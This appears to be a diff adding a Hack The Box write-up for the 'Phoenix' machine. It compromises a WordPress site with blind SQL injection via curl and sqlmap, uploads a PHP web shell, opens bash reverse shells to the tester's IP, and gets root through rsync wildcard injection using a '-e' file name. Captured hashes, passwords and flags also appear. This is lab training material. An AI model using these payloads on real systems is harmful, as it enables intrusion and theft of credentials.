@@ -1,0 +1,166 @@
+ip : 10.10.11.149
+Domain : phoenix.htb
+
+Nmap 
+----
+- 3 open ports 22, 80 and 443
+- reveals the domain name to be phoenix.htb, add that to the host file
+
+Enumeration
+-----------
+- visiting phoenix.htb we get a regular blog and browsing through it we found phoenix security page consists of sign-up, login and forums 
+- checking the source code of the page we found that this is a wordpress site, wordpress 5.9
+- using wpscan to enumerate for possible usernames and vulnerabilities  
+
+	wpscan --url https://phoenix.htb --enumerate u,at,ap --disable-tls-checks --api-token $WPSCANTOKEN
+	
+- wpscan identified 3 vulnerabilities for wordpress 5.9 and a handful of users 
+
+	Users 
+	-----
+	john smith
+	jsmith
+	phoenix (admin, UID=1)
+	john
+	jane 
+	jack
+	
+- following the link provided by wpscan along with the username enumeration we can find that the user phoenix is the admin of the site and has the UID of 1
+- from the wpscan result we can see that the asgaros forum has 4 vulnerabilities 
+- out of wchich 2 needs admin level access and 1 subscriber level access and an unauthenticated sqli 
+- unauthenticated sqli CVE-2021-24827, poc is in the wpscan page and following the steps in that we found thatthe site is defenitly vulnerable to blind sql injection
+	
+	time curl -k 'https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)'>/dev/null
+	time curl -k 'https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(1)'>/dev/null 
+	
+- the time matches to the sleep time hence the site is vulnerable 
+- starting off sqlmap for further enumeraion 
+- --technique is type of sqli to be used, in this case time based
+- -D is the DBMS database to enumerate 
+- enumerate table wp_users, column id, user_pass
+- user id we obtained from the wpscan
+	
+	sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T --level 5 -D wordpress -T wp_users -C id,user_pass --where "ID=1 or ID=5" --dump --batch
+	
+- time based sql injection is a success and we get the hashes of the user 
+
+	phoenix		$P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc.
+ 	john smith	$P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G.
+
+creds
+-----
+ 	phoenix:phoenixthefirebird14
+	john:superphoenix
+
+- try to login to the machine through the login page but the site has 2 factor authentication 
+
+shell as wp-user
+----------------
+- looking at the installed wordpress plugins the download from files looks interesting 
+- searching for it in google brings up a exploitdb page with a python3 exploit
+- download the exploit and make necessary changes to it 
+- add these two lines to eliminate warnings 
+
+	import urllib3
+	urllib3.disable_warnings() 
+
+- add the following code to every responses to disable TLS verification
+
+	verify=False
+
+- the exploit needs two arguments, the target url and a php/phtml file to be uploaded into the victim system 
+- creating a simple php code
+	
+		<?
+		echo("Lord")
+		system($_REQUEST['cmd']);
+		?> 
+
+- now we run the exploit 
+
+	python3 exploit.py https://phoenix.htb shell.phtml
+
+- follow the returned url
+- we will see the output of the print statement
+- check the smd parameter
+
+	https://phoenix.htb/wp-admin/shell.phtml?cmd=id
+	
+- looks like its working fine 
+- intercept the id request with burp and send it to repeater
+- setup a netcat listener 
+
+	nv -nlvp 9001
+	
+- change the request method to POST and add a basic bash reverse shell in url encoded format and send it  
+
+	cmd = bash -c 'bash -i >& /dev/tcp/10.10.14.64/9001 0>&1'
+
+- we can see that we now have a shell as wp-user
+
+shell as editor
+---------------
+- get a stable shell using python3
+
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	 
+- changing into the editor user wont work either 
+- checking ip a on the arget we can see that the host has a second NIC
+- the ip address is 10.11.12.13
+- checking the /etc/passwd file to check the access of the users on the machine 
+- there are 3 users with shell access john smith, editor and root
+- note that the john smiths name in system is editor 
+- since we have the password for editor (john smith), tried su into the user but didnt work
+- trying to ssh into editor from kali requires multifactor authentication which means the password we provided was infact correct 
+- trying to ssh into editor from localhost works 
+
+	ssh editor@10.11.12.13
+	password : superphoenix
+
+- now we have a a shell as editor  
+- user.txt
+	
+	598d1f44f7f54ca986c1dc9230295dbf
+	
+Priv-esc
+--------
+- browsing around the filesystem we find a interesting file in /usr/local/bin which looks like a cronjob
+- trying to read the file but didnt work
+- the cron.sh.x is encrypted somehow 
+- googling sh.x found that the tool SHc is used to encrypt a script to make it more secure 
+- This tool protect any shell script with encryption (ARC4) 
+- trying to decrypt the script or read the content of the script somehow 
+- running the script hangs the system 
+- run the script and background it using ^z
+- get the pid of the job using the command 
+
+	jobs -p	
+
+- read the script using cat /proc/76149/cmdline
+- we can see the entire script 
+- root with wildcard injection
+- The trick is to make a file that actually looks like an argument to the command being run
+- the script contains rsync command 
+- the rsync command has a -e option
+- we can make a file with name starts with -e so that the wildcard will inject it into the command when the cronjob runs
+- create 2 files
+- create a simple reverse shell using echo and save it as lord.sh
+
+	echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.64/1337 0>&1' > lord.sh
+
+- a simple file with the name starts with -e
+- the -- tells the command that everything after it is not an argument and hence the file will be created in that name  
+ 
+	touch -- '-e bash lord.sh'
+
+- save both files in /backups directory
+- start a netcat listener 
+
+	nc -nlvp 1337
+	
+- in every 3 minutes when the cronjob runs we will have a reverse shell
+- grab the root flag 
+
+- root.txt
+
+	03a0bf260a09d2d13478790f25278bd4
